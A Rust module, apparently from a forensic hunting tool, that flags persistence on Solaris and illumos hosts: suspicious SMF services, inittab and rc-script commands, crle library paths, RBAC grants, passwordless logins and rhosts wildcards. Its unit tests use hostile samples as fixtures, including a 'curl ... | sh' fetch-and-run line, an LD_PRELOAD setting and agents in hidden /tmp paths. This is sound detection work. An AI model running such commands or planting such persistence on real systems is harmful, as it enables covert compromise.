//! The persistence checks for Solaris and illumos records. A child module of `hunt_checks`, whose
//! helpers (`susp`, `text`, `starts_with_temp`, `script_writable`) it uses; the rows that point at
//! these functions are at the end of `CHECKS`.

use super::{script_writable, starts_with_temp, susp, suspicious_command, text};
use serde_json::Value;

/// True when `path` is in a directory the base system installs programs in.
fn system_path(path: &str) -> bool {
    [
        "/usr/",
        "/sbin/",
        "/lib/",
        "/etc/",
        "/kernel/",
        "/platform/",
        "/opt/ooce/",
        "/opt/csw/",
        "/opt/local/",
        "/var/svc/",
        "/var/lib/",
    ]
    .iter()
    .any(|p| path.starts_with(p))
}

/// The first word of an SMF method string: the program, or a `:true` / `:kill` pseudo-method.
fn program(command: &str) -> &str {
    command.split_whitespace().next().unwrap_or_default()
}

fn str_list<'a>(record: &'a Value, field: &str) -> Vec<&'a str> {
    record[field].as_array().map(|a| a.iter().filter_map(Value::as_str).collect()).unwrap_or_default()
}

/// A start method of an enabled (or not yet disabled) service that runs from a temporary or hidden location.
pub fn smf_start_method(record: &Value) -> Option<String> {
    if record["enabled"] == false {
        return None;
    }
    let command = text(record, "start_exec");
    let why = susp(record, "start_exec").or_else(|| {
        let p = program(command);
        (starts_with_temp(p) || p.contains("/."))
            .then(|| format!("start method runs from a temporary or hidden path: {command}"))
    })?;
    Some(format!("{}: {why}", text(record, "fmri")))
}

/// An enabled service that was imported from a site manifest, or lives in the `site` category.
pub fn smf_site_service(record: &Value) -> Option<String> {
    let site = text(record, "service").starts_with("site/")
        || str_list(record, "manifest_files").iter().any(|f| f.contains("/manifest/site/"));
    (site && record["enabled"] == true).then(|| format!("{} runs {}", text(record, "fmri"), text(record, "start_exec")))
}

/// A start, stop or refresh method of a site manifest that runs suspicious code.
pub fn smf_manifest_exec(record: &Value) -> Option<String> {
    ["start_exec", "stop_exec", "refresh_exec"].iter().find_map(|f| {
        let command = text(record, f);
        let why = susp(record, f).or_else(|| {
            let p = program(command);
            (starts_with_temp(p) || p.contains("/.")).then(|| "runs from a temporary or hidden path".to_string())
        })?;
        Some(format!("{} {f}: {why}: {command}", text(record, "service")))
    })
}

pub fn smf_manifest_present(record: &Value) -> Option<String> {
    Some(format!(
        "manifest for {} ({}) starts {}",
        text(record, "service"),
        str_list(record, "instances").join(", "),
        text(record, "start_exec")
    ))
}

/// Entries of the stock Solaris and illumos `inittab`: the SMF bootstrap and the power-fail line.
const STOCK_INITTAB: [&str; 8] = ["ap", "sp", "smf", "p3", "s0", "s1", "s5", "s6"];

pub fn inittab_unusual(record: &Value) -> Option<String> {
    let id = text(record, "id");
    (!STOCK_INITTAB.contains(&id) && !text(record, "action").is_empty())
        .then(|| format!("{id}:{}:{}:{}", text(record, "run_levels"), text(record, "action"), text(record, "command")))
}

pub fn inittab_suspicious(record: &Value) -> Option<String> {
    susp(record, "command")
}

/// A command of the script that is suspicious by itself. A match on "runs from a temporary directory" needs
/// the program itself to be there: a stock script that mentions `/var/tmp/Ex*` in an argument is not one.
pub fn rc_script_lines(record: &Value) -> Option<String> {
    text(record, "commands").split("; ").find_map(|command| {
        let why = suspicious_command(command)?;
        let local = why.contains("temporary") || why.contains("hidden");
        // The program is the first word; a command that starts with `name=value` runs nothing itself.
        let first = command.split_whitespace().next().unwrap_or_default();
        (!local || (!first.contains('=') && (starts_with_temp(first) || first.contains("/."))))
            .then(|| format!("{why}: {command}"))
    })
}

pub fn rc_script_writable(record: &Value) -> Option<String> {
    script_writable(record)
}

/// The directories of a crle path list that are not system directories.
pub fn crle_path(record: &Value) -> Option<String> {
    if text(record, "kind") != "path" {
        return None;
    }
    let outside: Vec<&str> =
        str_list(record, "directories").into_iter().filter(|d| !system_path(&format!("{d}/"))).collect();
    let temp = outside.iter().any(|d| starts_with_temp(d) || d.split('/').any(|s| s.starts_with('.') && s.len() > 1));
    (!outside.is_empty()).then(|| {
        format!(
            "{} {}search path outside the system directories: {}",
            text(record, "source_path"),
            if temp { "temporary or hidden " } else { "" },
            outside.join(":")
        )
    })
}

pub fn crle_path_temp(record: &Value) -> Option<String> {
    let outside = crle_path(record)?;
    outside.contains("temporary or hidden").then_some(outside)
}

pub fn crle_environment(record: &Value) -> Option<String> {
    (text(record, "kind") == "environment")
        .then(|| format!("{}: {}", text(record, "source_path"), text(record, "value")))
}

pub fn system_forceload(record: &Value) -> Option<String> {
    (text(record, "directive") == "forceload").then(|| format!("forceload: {}", text(record, "name")))
}

pub fn system_moddir(record: &Value) -> Option<String> {
    (text(record, "directive") == "moddir")
        .then(|| format!("moddir: {} {}", text(record, "name"), text(record, "value")))
}

/// A profile or authorization that is as good as root, given to an account that is not root.
pub fn user_attr_root_equivalent(record: &Value) -> Option<String> {
    let user = text(record, "user");
    if user == "root" {
        return None;
    }
    let profiles = str_list(record, "profiles");
    let auths = str_list(record, "authorizations");
    let via: Vec<String> = profiles
        .iter()
        .filter(|p| ["All", "Primary Administrator", "Software Installation"].contains(*p))
        .map(|p| format!("profile {p}"))
        .chain(
            auths
                .iter()
                .filter(|a| ["solaris.*", "solaris.grant", "solaris.*.*"].contains(*a))
                .map(|a| format!("authorization {a}")),
        )
        .collect();
    (!via.is_empty() && text(record, "account_type") != "role").then(|| format!("{user} holds {}", via.join(", ")))
}

/// A profile whose command runs as root from outside the system directories.
pub fn rbac_exec_root(record: &Value) -> Option<String> {
    let command = text(record, "command");
    (text(record, "table") == "exec_attr"
        && record["runs_as_root"] == true
        && command.starts_with('/')
        && !system_path(command))
    .then(|| format!("profile {} runs {command} as root ({})", text(record, "name"), text(record, "source_path")))
}

pub fn at_job(record: &Value) -> Option<String> {
    Some(format!("at job: {}", text(record, "command")))
}

pub fn at_job_suspicious(record: &Value) -> Option<String> {
    susp(record, "command")
}

pub fn shadow_passwordless(record: &Value) -> Option<String> {
    (record["passwordless"] == true).then(|| format!("{} can log in without a password", text(record, "user")))
}

/// `PASSREQ=NO` in `etc/default/login` lets an account with no password log in; a `PATH` or `SUPATH`
/// for `su`/`login` that starts in a temporary directory or `.` runs programs from there as root.
pub fn default_files(record: &Value) -> Option<String> {
    let (command, name, value) = (text(record, "command"), text(record, "name"), text(record, "value"));
    match (command, name) {
        ("login", "PASSREQ") if value.eq_ignore_ascii_case("no") => {
            Some("login: PASSREQ=NO allows logins with no password".into())
        }
        ("login" | "su", "PATH" | "SUPATH") => {
            let bad = value.split(':').find(|d| d.is_empty() || *d == "." || starts_with_temp(d))?;
            Some(format!("{command}: {name} contains {}", if bad.is_empty() { "an empty entry" } else { bad }))
        }
        _ => None,
    }
}

pub fn pam_module_path(record: &Value) -> Option<String> {
    let module = text(record, "module");
    let usual = ["/usr/lib/security/", "/lib/security/", "/usr/lib/"];
    (module.starts_with('/') && !usual.iter().any(|p| module.starts_with(p)))
        .then(|| format!("{}: {module}", text(record, "service")))
}

pub fn rhosts_wildcard(record: &Value) -> Option<String> {
    (record["wildcard"] == true && record["denies"] == false).then(|| {
        format!(
            "{} trusts every host or user: {} {}",
            text(record, "source_path"),
            text(record, "trusted_host"),
            text(record, "user")
        )
    })
}

pub fn rhosts_entry(record: &Value) -> Option<String> {
    (record["denies"] == false)
        .then(|| format!("{}: {} {}", text(record, "source_path"), text(record, "trusted_host"), text(record, "user")))
}

pub fn kernel_drv_no_module(record: &Value) -> Option<String> {
    (record["module_in_kernel_tree"] == false)
        .then(|| format!("{} has a driver configuration file and no driver module", text(record, "driver")))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn check(id: &str, record: &Value) -> Option<String> {
        let found: Vec<_> =
            super::super::CHECKS.iter().filter(|c| c.id == id && c.artifact == text(record, "artifact")).collect();
        assert_eq!(found.len(), 1, "{id}");
        (found[0].test)(record)
    }

    #[test]
    fn smf_services_that_run_from_temp_are_flagged() {
        let svc = |start: &str, enabled: Value| {
            json!({"artifact": "smf-repository", "fmri": "svc:/site/x:default", "service": "site/x", "enabled": enabled,
                   "start_exec": start, "manifest_files": ["/var/svc/manifest/site/x.xml"]})
        };
        assert!(check("smf-start-method-suspicious", &svc("/tmp/.NXMK_SMF/agent --quiet", json!(true))).is_some());
        assert!(check("smf-start-method-suspicious", &svc("/tmp/agent", json!(false))).is_none());
        assert!(check("smf-start-method-suspicious", &svc("/lib/svc/method/sshd start", json!(true))).is_none());
        assert!(check("smf-site-service-enabled", &svc("/var/svc/method/x %m", json!(true))).is_some());
        assert!(check("smf-site-service-enabled", &svc("/var/svc/method/x %m", json!(false))).is_none());
    }

    #[test]
    fn crle_paths_and_environment() {
        let path = |dirs: Value| json!({"artifact": "crle-config", "kind": "path", "directories": dirs, "source_path": "var/ld/ld.config"});
        assert!(check("crle-path-outside-system", &path(json!(["/lib", "/usr/lib", "/tmp/.x"]))).is_some());
        assert!(check("crle-path-temporary", &path(json!(["/lib", "/tmp/.x"]))).is_some());
        assert!(check("crle-path-outside-system", &path(json!(["/lib", "/usr/lib", "/opt/app/lib"]))).is_some());
        assert!(check("crle-path-temporary", &path(json!(["/lib", "/opt/app/lib"]))).is_none());
        assert!(check("crle-path-outside-system", &path(json!(["/lib/64", "/usr/lib/64", "/lib/secure/64"]))).is_none());
        let env = json!({"artifact": "crle-config", "kind": "environment", "value": "LD_PRELOAD=/tmp/x.so", "source_path": "var/ld/ld.config"});
        assert!(check("crle-environment-setting", &env).is_some());
    }

    #[test]
    fn rbac_and_defaults() {
        let attr = |user: &str, profiles: Value| json!({"artifact": "user-attr", "user": user, "profiles": profiles, "authorizations": [], "account_type": "normal"});
        assert!(check("user-attr-root-equivalent", &attr("mallory", json!(["Primary Administrator"]))).is_some());
        assert!(check("user-attr-root-equivalent", &attr("root", json!(["All"]))).is_none());
        assert!(check("user-attr-root-equivalent", &attr("bob", json!(["Printer Management"]))).is_none());
        let exec = |cmd: &str| json!({"artifact": "rbac-profiles", "table": "exec_attr", "name": "P", "command": cmd, "runs_as_root": true, "source_path": "etc/security/exec_attr"});
        assert!(check("rbac-exec-attr-root-outside-system", &exec("/tmp/.x/agent")).is_some());
        assert!(check("rbac-exec-attr-root-outside-system", &exec("/usr/sbin/svcadm")).is_none());
        assert!(check("rbac-exec-attr-root-outside-system", &exec("*")).is_none());
        let setting = |command: &str, name: &str, value: &str| json!({"artifact": "default-files", "command": command, "name": name, "value": value});
        assert!(check("login-su-defaults", &setting("login", "PASSREQ", "NO")).is_some());
        assert!(check("login-su-defaults", &setting("login", "PASSREQ", "YES")).is_none());
        assert!(check("login-su-defaults", &setting("su", "SUPATH", "/tmp/.x:/usr/sbin")).is_some());
        assert!(check("login-su-defaults", &setting("su", "SUPATH", "/usr/sbin:/usr/bin")).is_none());
    }

    #[test]
    fn rc_scripts_are_judged_by_the_program_not_by_an_argument() {
        let script =
            |commands: &str| json!({"artifact": "rc-scripts", "commands": commands, "mode": "100744", "uid": 0});
        assert!(check("rc-script-suspicious", &script("/tmp/.NXMK_RC2/agent &")).is_some());
        assert!(check("rc-script-suspicious", &script("[ -x /usr/bin/x ]; /var/tmp/x/run start")).is_some());
        assert!(check("rc-script-suspicious", &script("curl -fsSL http://203.0.113.5/i | sh")).is_some());
        assert!(check(
            "rc-script-suspicious",
            &script("exfiles=`echo /var/tmp/Ex*`; [ \"$exfiles\" != '/var/tmp/Ex*' ] && echo x")
        )
        .is_none());
        assert!(check("rc-script-suspicious", &script("/usr/sbin/svcadm enable x")).is_none());
        assert!(check("rc-script-writable", &json!({"artifact": "rc-scripts", "mode": "100764", "uid": 0})).is_some());
    }

    #[test]
    fn kernel_and_init_entries() {
        let sys =
            |directive: &str| json!({"artifact": "etc-system", "directive": directive, "name": "drv/x", "value": ""});
        assert!(check("etc-system-forceload", &sys("forceload")).is_some());
        assert!(check("etc-system-forceload", &sys("set")).is_none());
        assert!(check("etc-system-moddir", &sys("moddir")).is_some());
        let init = |id: &str| json!({"artifact": "inittab", "id": id, "run_levels": "3", "action": "once", "command": "/tmp/.x/agent"});
        assert!(check("inittab-unusual-entry", &init("nx")).is_some());
        assert!(check("inittab-unusual-entry", &init("smf")).is_none());
        assert!(check("inittab-suspicious-command", &init("nx")).is_some());
    }
}
